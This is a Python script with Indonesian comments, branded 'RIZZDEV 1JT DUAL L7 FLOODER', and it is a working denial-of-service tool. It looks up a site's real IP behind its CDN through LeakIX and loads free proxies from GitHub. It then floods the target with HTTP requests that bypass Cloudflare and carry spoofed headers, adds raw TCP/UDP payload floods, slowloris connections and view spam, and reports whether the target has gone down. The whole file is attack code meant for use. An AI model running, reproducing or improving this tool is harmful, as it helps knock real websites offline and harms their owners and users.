import cloudscraper, socket, threading, random, time, os, string, requests, re, httpx
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from threading import Lock, Thread

# === FUNGSI: Coba cari Real IP lewat LeakIX ===
def resolve_real_ip(domain):
    print(f"🔍 Mencari real IP untuk: {domain} ...")
    try:
        res = requests.get(f"https://leakix.net/domain/{domain}", timeout=5)
        ip_list = re.findall(r'/host/([\d\.]+)"', res.text)
        unique_ips = list(set(ip_list))
        if unique_ips:
            print(f"💥 Real IP ditemukan: {unique_ips[0]}")
            return unique_ips[0]
        else:
            print("❌ Tidak ada real IP ditemukan.")
            return None
    except Exception as e:
        print(f"❌ Error saat mencari real IP: {e}")
        return None

# === INPUT TARGET ===
TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
MAX_THREADS = int(input("🧵 Jumlah Threads (Total): "))
PAYLOAD_MB = int(input("📦 Payload per Request (MB): "))
DELAY = float(input("⏱ Delay antar Batch L7 (detik): "))
USE_PROXY = input("🌐 Gunakan proxy dari GitHub list? (y/n): ").strip().lower() == 'y'
ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'

parsed = urlparse(TARGET_URL)
TARGET_DOMAIN = parsed.hostname
REAL_IP = resolve_real_ip(TARGET_DOMAIN)
TARGET_IP = REAL_IP if REAL_IP else socket.gethostbyname(TARGET_DOMAIN)
TARGET_PORT = 80 if parsed.scheme == "http" else 443
print(f"✅ IP Target: {TARGET_IP}:{TARGET_PORT}")

# === DETEKSI PROTOKOL L4 ===
def check_tcp(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def check_udp(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(b"ping", (ip, port))
        s.close()
        return True
    except:
        return False

tcp_ok = check_tcp(TARGET_IP, TARGET_PORT)
udp_ok = check_udp(TARGET_IP, TARGET_PORT)
PROTOCOL = "tcp" if tcp_ok else "udp" if udp_ok else "tcp"
print(f"🧠 Auto Protocol L4 terdeteksi: {PROTOCOL.upper()}")

# === PROXY ===
proxies = []
if USE_PROXY:
    try:
        res = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt")
        proxies = res.text.strip().split('\n')
        print(f"✅ {len(proxies)} proxy dimuat.")
    except:
        print("❌ Gagal ambil proxy.")
        USE_PROXY = False

# === MONITORING VARIABEL ===
sukses = gagal = total_data = l4_sent = view_sent = total_req = slowloris_conn = socket_sent = 0
target_status = "🟢 OKE"
lock = Lock()

# === TOOLS TAMBAHAN ===
def kotak(text):
    lines = text.strip().split("\n")
    panjang = max(len(line) for line in lines)
    bar = "═" * (panjang + 4)
    box = [f"╔{bar}╗"]
    for line in lines:
        box.append(f"║  {line.ljust(panjang)}  ║")
    box.append(f"╚{bar}╝")
    return "\n".join(box)

def gen_data():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=PAYLOAD_MB * 1024 * 1024))

def random_headers():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6)",
        "Mozilla/5.0 (Linux; Android 12)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    ])
    return {
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Referer": f"https://www.google.com/search?q={random.randint(1000,9999)}",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={''.join(random.choices('abcdef0123456789', k=32))}"
    }

# === VECTOR: ATTACK L7 DUAL ===
def attack_l7_dual():
    global sukses, gagal, total_data, total_req
    try:
        scraper = cloudscraper.create_scraper(delay=0, browser={"custom": "Chrome"})
        proxy = random.choice(proxies) if USE_PROXY and proxies else None
        if proxy:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})

        for _ in range(1_000_000):
            method = random.choice(["POST", "GET", "HEAD"])
            path = random.choice(["", "api", "upload", "search", "view"])
            query = f"?r={random.randint(1111,9999)}"
            url_domain = f"{TARGET_URL}/{path}{query}"
            url_ip = f"http://{REAL_IP}/{path}{query}"
            for url, headers in [(url_domain, random_headers()), (url_ip, random_headers())]:
                if url == url_ip:
                    headers["Host"] = TARGET_DOMAIN
                try:
                    if method == "POST":
                        data = gen_data()
                        if random.choice(["form", "multipart"]) == "form":
                            headers["Content-Type"] = "application/x-www-form-urlencoded"
                            scraper.post(url, headers=headers, data={"data": data}, timeout=5)
                        else:
                            scraper.post(url, headers=headers, files={"file": ("data.txt", data)}, timeout=5)
                        sent = len(data)
                    else:
                        scraper.request(method, url, headers=headers, timeout=5)
                        sent = 0
                    with lock:
                        sukses += 1
                        total_data += sent
                        total_req += 1
                except:
                    with lock:
                        gagal += 1
                        total_req += 1
            time.sleep(DELAY)
    except:
        pass

# === VECTOR: ATTACK L4 ===
def attack_l4():
    global l4_sent, total_req
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if PROTOCOL == "udp" else socket.SOCK_STREAM)
            sock.settimeout(3)
            payload = gen_data().encode()
            try:
                if PROTOCOL == "tcp":
                    sock.connect((TARGET_IP, TARGET_PORT))
                    sock.sendall(payload)
                else:
                    sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            except:
                pass
            with lock:
                l4_sent += len(payload)
                total_req += 1
            sock.close()
    except:
        pass

# === VECTOR: SOCKET FLOOD ===
def socket_flood():
    global socket_sent, total_req
    try:
        while True:
            payload = gen_data().encode()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if PROTOCOL == "tcp" else socket.SOCK_DGRAM)
                sock.settimeout(3)
                if PROTOCOL == "tcp":
                    sock.connect((TARGET_IP, TARGET_PORT))
                    sock.sendall(payload)
                else:
                    sock.sendto(payload, (TARGET_IP, TARGET_PORT))
                with lock:
                    socket_sent += len(payload)
                    total_req += 1
                sock.close()
            except:
                with lock:
                    total_req += 1
    except:
        pass

# === VECTOR: SLOWLORIS ===
def slowloris():
    global slowloris_conn
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\n".encode())
            for _ in range(50):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(15)
                except:
                    break
            with lock:
                slowloris_conn += 1
    except:
        pass

# === VECTOR: VIEW SPAM ===
def spam_view():
    global view_sent, total_req
    try:
        scraper = cloudscraper.create_scraper()
        proxy = random.choice(proxies) if USE_PROXY and proxies else None
        if proxy:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
        headers = random_headers()
        while True:
            try:
                url = f"{TARGET_URL}?view={random.randint(100000,999999)}"
                scraper.get(url, headers=headers, timeout=5)
                with lock:
                    view_sent += 1
                    total_req += 1
            except:
                with lock:
                    total_req += 1
    except:
        pass

# === CEK STATUS ===
def cek_target_status():
    global target_status
    try:
        r = requests.get(TARGET_URL, timeout=3)
        target_status = "🔴 DOWN" if r.status_code >= 500 else "🟢 OKE"
    except:
        target_status = "🔴 DOWN"

# === MONITOR ===
def monitor():
    prev_sukses = prev_gagal = prev_data = prev_l4 = prev_view = prev_slow = prev_sock = 0
    while True:
        time.sleep(5)
        cek_target_status()
        with lock:
            ds = sukses - prev_sukses
            dg = gagal - prev_gagal
            dd = total_data - prev_data
            dl4 = l4_sent - prev_l4
            dv = view_sent - prev_view
            dslo = slowloris_conn - prev_slow
            dsock = socket_sent - prev_sock
            prev_sukses, prev_gagal, prev_data = sukses, gagal, total_data
            prev_l4, prev_view = l4_sent, view_sent
            prev_slow, prev_sock = slowloris_conn, socket_sent
        info = (
            f"📊 L7:\n"
            f"   ✅ Sukses: {sukses}\n"
            f"   ❌ Gagal: {gagal}\n"
            f"   📦 Data: {round(total_data/1024/1024, 2)} MB\n"
            f"   ⚡ Speed: {round(dd/1024/1024/5, 2)} MB/s\n\n"
            f"📡 L4:\n"
            f"   📦 Total (cloudscraper): {round(l4_sent/1024/1024, 2)} MB\n"
            f"   📦 Total (socket): {round(socket_sent/1024/1024, 2)} MB\n"
            f"   ⚡ Speed: {round((dl4+dsock)/1024/1024/5, 2)} MB/s\n\n"
            f"👁️ VIEW:\n"
            f"   👁️ Total View: {view_sent}\n"
            f"   🚀 Speed: {dv}/5s\n\n"
            f"🧪 SLOWLORIS:\n"
            f"   🔗 Conn Aktif: {slowloris_conn}\n"
            f"   ⚡ Conn Baru: {dslo}/5s\n\n"
            f"📈 Total Request: {total_req} (1JT x thread)\n\n"
            f"📡 STATUS: URL : {target_status}"
        )
        print(kotak(info))

# === MAIN ===
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(kotak("🔥 RIZZDEV 1JT DUAL L7 FLOODER 🔥"))
    Thread(target=monitor, daemon=True).start()
    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            for _ in range(MAX_THREADS):
                ex.submit(attack_l7_dual)
                ex.submit(attack_l4)
                ex.submit(socket_flood)
                ex.submit(slowloris)
                if ENABLE_VIEW:
                    ex.submit(spam_view)
    except KeyboardInterrupt:
        print("\n⛔ Dihentikan oleh user.")

if __name__ == "__main__":
    main()